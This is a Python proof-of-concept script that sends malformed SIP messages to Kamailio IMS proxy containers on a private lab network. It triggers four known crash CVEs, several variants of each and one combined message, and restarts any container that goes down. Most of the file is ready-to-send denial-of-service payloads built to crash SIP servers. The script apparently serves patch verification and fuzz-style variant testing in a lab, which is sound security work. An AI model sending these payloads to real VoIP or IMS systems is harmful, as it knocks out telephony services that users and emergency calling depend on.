#!/usr/bin/env python3
"""
Kamailio CSCF CVE-based PoC Collection
======================================
Based on confirmed CVEs with public exploits.

CVEs:
1. CVE-2018-16657 - Invalid Via header causes segfault in crcitt_string_array
   - Fixed in: 5.0.7, 5.1.4
   - Trigger: Via: SIP/2.0/UDP :]

2. CVE-2018-14767 - Double To header with empty tag causes segfault
   - Fixed in: 5.0.7, 5.1.4
   - Trigger: Two To headers, second with empty tag

3. CVE-2020-27507 - INVITE with duplicated fields and overlength tag
   - Fixed in: 5.5.0
   - Trigger: Duplicated headers + long tag in INVITE

4. CVE-2018-8828 - Off-by-one heap overflow in tmx_check_pretran
   - Fixed in: 4.4.7, 5.0.6, 5.1.2
   - Trigger: Malformed branch or From tag in REGISTER

Target: Kamailio 6.1.3 (should be patched, testing for variants)

Usage:
    python3 cve_poc_collection.py --target pcscf --cve all
"""

import socket
import subprocess
import time
import sys
import argparse

PCSCF_IP = "172.22.0.21"
PCSCF_PORT = 5060
ICSCF_IP = "172.22.0.19"
ICSCF_PORT = 4060
SCSCF_IP = "172.22.0.20"
SCSCF_PORT = 6060


def check_container(name):
    result = subprocess.run(
        ['docker', 'inspect', '-f', '{{.State.Running}}', name],
        capture_output=True, text=True
    )
    return result.stdout.strip() == 'true'


def send_sip(msg, target_ip, target_port, proto='udp', timeout=3):
    try:
        if proto == 'udp':
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(timeout)
            sock.sendto(msg.encode() if isinstance(msg, str) else msg,
                       (target_ip, target_port))
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((target_ip, target_port))
            sock.send(msg.encode() if isinstance(msg, str) else msg)
        try:
            data = sock.recv(65535)
            return data.decode(errors='ignore')
        except socket.timeout:
            return None
        finally:
            sock.close()
    except Exception as e:
        return str(e)


class CVEPoC:
    """CVE-based PoC collection"""

    def __init__(self):
        self.results = []

    def log(self, msg):
        print(f"[*] {msg}")

    def record(self, cve, target, crashed, details=""):
        self.results.append({
            'cve': cve,
            'target': target,
            'crashed': crashed,
            'details': details
        })
        status = "CRASHED" if crashed else "no crash"
        print(f"    Result: {status}")

    # ========================================================================
    # CVE-2018-16657: Invalid Via header
    # ========================================================================
    def test_cve_2018_16657(self, target_ip, target_port, target_name):
        """
        CVE-2018-16657: Invalid Via header causes segfault
        Original PoC: Via: SIP/2.0/UDP :]
        """
        self.log(f"CVE-2018-16657: Invalid Via header -> {target_name}")

        # Original PoC
        msg1 = "INVITE sip:0 SIP/2.0\nTo: 0\nVia: SIP/2.0/UDP :]\n\r\n"

        # Variants
        variants = [
            ("original", msg1),
            ("empty_host", "INVITE sip:0 SIP/2.0\r\nTo: 0\r\nVia: SIP/2.0/UDP \r\n\r\n"),
            ("bracket_only", "INVITE sip:0 SIP/2.0\r\nTo: 0\r\nVia: SIP/2.0/UDP []\r\n\r\n"),
            ("colon_only", "INVITE sip:0 SIP/2.0\r\nTo: 0\r\nVia: SIP/2.0/UDP :\r\n\r\n"),
            ("null_byte", "INVITE sip:0 SIP/2.0\r\nTo: 0\r\nVia: SIP/2.0/UDP \x00\r\n\r\n"),
            ("ipv6_invalid", "INVITE sip:0 SIP/2.0\r\nTo: 0\r\nVia: SIP/2.0/UDP [::]\r\n\r\n"),
            ("port_overflow", "INVITE sip:0 SIP/2.0\r\nTo: 0\r\nVia: SIP/2.0/UDP host:999999999\r\n\r\n"),
        ]

        for name, msg in variants:
            print(f"  Variant: {name}")
            send_sip(msg, target_ip, target_port)
            time.sleep(0.3)
            if not check_container(target_name):
                self.record("CVE-2018-16657", target_name, True, name)
                return True

        self.record("CVE-2018-16657", target_name, False)
        return False

    # ========================================================================
    # CVE-2018-14767: Double To header
    # ========================================================================
    def test_cve_2018_14767(self, target_ip, target_port, target_name):
        """
        CVE-2018-14767: Double To header with empty tag causes segfault
        """
        self.log(f"CVE-2018-14767: Double To header -> {target_name}")

        variants = [
            ("double_to_empty_tag",
             "INVITE sip:0 SIP/2.0\r\n"
             "Via: SIP/2.0/UDP 127.0.0.1\r\n"
             "To: <sip:0>\r\n"
             "To: <sip:0>;tag=\r\n"
             "From: <sip:0>;tag=0\r\n"
             "Call-ID: 0\r\n"
             "CSeq: 0 INVITE\r\n"
             "Content-Length: 0\r\n\r\n"),

            ("double_to_no_tag",
             "INVITE sip:0 SIP/2.0\r\n"
             "Via: SIP/2.0/UDP 127.0.0.1\r\n"
             "To: <sip:0>\r\n"
             "To: <sip:1>\r\n"
             "From: <sip:0>;tag=0\r\n"
             "Call-ID: 0\r\n"
             "CSeq: 0 INVITE\r\n"
             "Content-Length: 0\r\n\r\n"),

            ("triple_to",
             "INVITE sip:0 SIP/2.0\r\n"
             "Via: SIP/2.0/UDP 127.0.0.1\r\n"
             "To: <sip:0>\r\n"
             "To: <sip:1>\r\n"
             "To: <sip:2>;tag=\r\n"
             "From: <sip:0>;tag=0\r\n"
             "Call-ID: 0\r\n"
             "CSeq: 0 INVITE\r\n"
             "Content-Length: 0\r\n\r\n"),
        ]

        for name, msg in variants:
            print(f"  Variant: {name}")
            send_sip(msg, target_ip, target_port)
            time.sleep(0.3)
            if not check_container(target_name):
                self.record("CVE-2018-14767", target_name, True, name)
                return True

        self.record("CVE-2018-14767", target_name, False)
        return False

    # ========================================================================
    # CVE-2020-27507: Duplicated fields with overlength tag
    # ========================================================================
    def test_cve_2020_27507(self, target_ip, target_port, target_name):
        """
        CVE-2020-27507: INVITE with duplicated fields and overlength tag
        Crash in build_local_reparse() in t_msgbuilder.c
        """
        self.log(f"CVE-2020-27507: Duplicated fields + long tag -> {target_name}")

        # Long tag (from original issue)
        long_tag = "t" * 500

        variants = [
            ("long_tag_route",
             f"INVITE sip:0 SIP/2.0\r\n"
             f"Via: SIP/2.0/UDP 127.0.0.1;branch=z9hG4bK-0\r\n"
             f"To: <sip:0>;tag={long_tag}\r\n"
             f"From: <sip:0>;tag=0\r\n"
             f"Call-ID: 0\r\n"
             f"CSeq: 0 INVITE\r\n"
             f"Route: <sip:127.0\"0{long_tag}K-0-1-7>\r\n"
             f"Content-Length: 0\r\n\r\n"),

            ("duplicate_cseq",
             "INVITE sip:0 SIP/2.0\r\n"
             "Via: SIP/2.0/UDP 127.0.0.1;branch=z9hG4bK-0\r\n"
             "To: <sip:0>;tag=0\r\n"
             "From: <sip:0>;tag=0\r\n"
             "Call-ID: 0\r\n"
             "CSeq: 0 INVITE\r\n"
             "CSeq: 1 INVITE\r\n"
             "Content-Length: 0\r\n\r\n"),

            ("duplicate_callid",
             "INVITE sip:0 SIP/2.0\r\n"
             "Via: SIP/2.0/UDP 127.0.0.1;branch=z9hG4bK-0\r\n"
             "To: <sip:0>;tag=0\r\n"
             "From: <sip:0>;tag=0\r\n"
             "Call-ID: 0\r\n"
             "Call-ID: 1\r\n"
             "CSeq: 0 INVITE\r\n"
             "Content-Length: 0\r\n\r\n"),

            ("duplicate_from",
             "INVITE sip:0 SIP/2.0\r\n"
             "Via: SIP/2.0/UDP 127.0.0.1;branch=z9hG4bK-0\r\n"
             "To: <sip:0>;tag=0\r\n"
             "From: <sip:0>;tag=0\r\n"
             "From: <sip:1>;tag=1\r\n"
             "Call-ID: 0\r\n"
             "CSeq: 0 INVITE\r\n"
             "Content-Length: 0\r\n\r\n"),

            ("duplicate_via",
             "INVITE sip:0 SIP/2.0\r\n"
             "Via: SIP/2.0/UDP 127.0.0.1;branch=z9hG4bK-0\r\n"
             "Via: SIP/2.0/UDP 127.0.0.2;branch=z9hG4bK-1\r\n"
             "To: <sip:0>;tag=0\r\n"
             "From: <sip:0>;tag=0\r\n"
             "Call-ID: 0\r\n"
             "CSeq: 0 INVITE\r\n"
             "Content-Length: 0\r\n\r\n"),
        ]

        for name, msg in variants:
            print(f"  Variant: {name}")
            send_sip(msg, target_ip, target_port)
            time.sleep(0.3)
            if not check_container(target_name):
                self.record("CVE-2020-27507", target_name, True, name)
                return True

        self.record("CVE-2020-27507", target_name, False)
        return False

    # ========================================================================
    # CVE-2018-8828: Off-by-one in tmx_check_pretran
    # ========================================================================
    def test_cve_2018_8828(self, target_ip, target_port, target_name):
        """
        CVE-2018-8828: Off-by-one heap overflow in tmx_check_pretran
        Trigger: Malformed branch or From tag in REGISTER
        """
        self.log(f"CVE-2018-8828: Off-by-one in tmx_check_pretran -> {target_name}")

        variants = [
            ("malformed_branch",
             "REGISTER sip:0 SIP/2.0\r\n"
             "Via: SIP/2.0/UDP 127.0.0.1;branch=z9hG4bK\r\n"  # Missing branch value
             "To: <sip:0>\r\n"
             "From: <sip:0>;tag=0\r\n"
             "Call-ID: 0\r\n"
             "CSeq: 0 REGISTER\r\n"
             "Content-Length: 0\r\n\r\n"),

            ("empty_branch",
             "REGISTER sip:0 SIP/2.0\r\n"
             "Via: SIP/2.0/UDP 127.0.0.1;branch=\r\n"
             "To: <sip:0>\r\n"
             "From: <sip:0>;tag=0\r\n"
             "Call-ID: 0\r\n"
             "CSeq: 0 REGISTER\r\n"
             "Content-Length: 0\r\n\r\n"),

            ("long_branch",
             "REGISTER sip:0 SIP/2.0\r\n"
             f"Via: SIP/2.0/UDP 127.0.0.1;branch=z9hG4bK{'A' * 1000}\r\n"
             "To: <sip:0>\r\n"
             "From: <sip:0>;tag=0\r\n"
             "Call-ID: 0\r\n"
             "CSeq: 0 REGISTER\r\n"
             "Content-Length: 0\r\n\r\n"),

            ("malformed_from_tag",
             "REGISTER sip:0 SIP/2.0\r\n"
             "Via: SIP/2.0/UDP 127.0.0.1;branch=z9hG4bK-0\r\n"
             "To: <sip:0>\r\n"
             "From: <sip:0>;tag=\r\n"  # Empty tag
             "Call-ID: 0\r\n"
             "CSeq: 0 REGISTER\r\n"
             "Content-Length: 0\r\n\r\n"),
        ]

        for name, msg in variants:
            print(f"  Variant: {name}")
            send_sip(msg, target_ip, target_port)
            time.sleep(0.3)
            if not check_container(target_name):
                self.record("CVE-2018-8828", target_name, True, name)
                return True

        self.record("CVE-2018-8828", target_name, False)
        return False

    # ========================================================================
    # Combined attack - multiple CVEs in one message
    # ========================================================================
    def test_combined(self, target_ip, target_port, target_name):
        """Combined attack using multiple CVE triggers"""
        self.log(f"Combined CVE attack -> {target_name}")

        msg = (
            "INVITE sip:0 SIP/2.0\r\n"
            "Via: SIP/2.0/UDP :]\r\n"  # CVE-2018-16657
            "Via: SIP/2.0/UDP 127.0.0.1\r\n"  # Duplicate Via
            "To: <sip:0>\r\n"
            "To: <sip:0>;tag=\r\n"  # CVE-2018-14767
            "From: <sip:0>;tag=\r\n"  # CVE-2018-8828
            "Call-ID: 0\r\n"
            "CSeq: 0 INVITE\r\n"
            "CSeq: 1 INVITE\r\n"  # CVE-2020-27507
            f"Route: <sip:{'A' * 500}@host>\r\n"  # Long URI
            "Content-Length: 0\r\n\r\n"
        )

        send_sip(msg, target_ip, target_port)
        time.sleep(0.5)
        crashed = not check_container(target_name)
        self.record("Combined", target_name, crashed)
        return crashed


def main():
    parser = argparse.ArgumentParser(description='Kamailio CVE PoC Collection')
    parser.add_argument('--target', choices=['pcscf', 'icscf', 'scscf', 'all'],
                        default='all', help='Target CSCF')
    parser.add_argument('--cve', default='all',
                        help='Specific CVE or "all"')
    args = parser.parse_args()

    print("=" * 70)
    print("Kamailio CSCF CVE-based PoC Collection")
    print("=" * 70)

    targets = {
        'pcscf': (PCSCF_IP, PCSCF_PORT, 'pcscf'),
        'icscf': (ICSCF_IP, ICSCF_PORT, 'icscf'),
        'scscf': (SCSCF_IP, SCSCF_PORT, 'scscf'),
    }

    if args.target == 'all':
        target_list = targets.values()
    else:
        target_list = [targets[args.target]]

    poc = CVEPoC()

    cve_tests = {
        'CVE-2018-16657': poc.test_cve_2018_16657,
        'CVE-2018-14767': poc.test_cve_2018_14767,
        'CVE-2020-27507': poc.test_cve_2020_27507,
        'CVE-2018-8828': poc.test_cve_2018_8828,
        'combined': poc.test_combined,
    }

    for target_ip, target_port, target_name in target_list:
        print(f"\n{'=' * 60}")
        print(f"Target: {target_name} ({target_ip}:{target_port})")
        print(f"{'=' * 60}")

        for cve_name, test_func in cve_tests.items():
            if args.cve == 'all' or args.cve == cve_name:
                try:
                    if test_func(target_ip, target_port, target_name):
                        print(f"\n*** CRASH DETECTED: {cve_name} ***")
                        print(f"Restarting {target_name}...")
                        subprocess.run(['docker', 'restart', target_name],
                                      capture_output=True)
                        time.sleep(10)
                except Exception as e:
                    print(f"Error: {e}")
                time.sleep(1)

    # Summary
    print("\n" + "=" * 70)
    print("SUMMARY")
    print("=" * 70)

    crashes = [r for r in poc.results if r['crashed']]
    if crashes:
        print(f"\nCrashes detected: {len(crashes)}")
        for c in crashes:
            print(f"  - {c['cve']} on {c['target']}: {c['details']}")
    else:
        print("\nNo crashes detected.")
        print("\nNote: Kamailio 6.1.3 should have all these CVEs patched.")
        print("These PoCs are for verification and variant testing.")


if __name__ == '__main__':
    main()
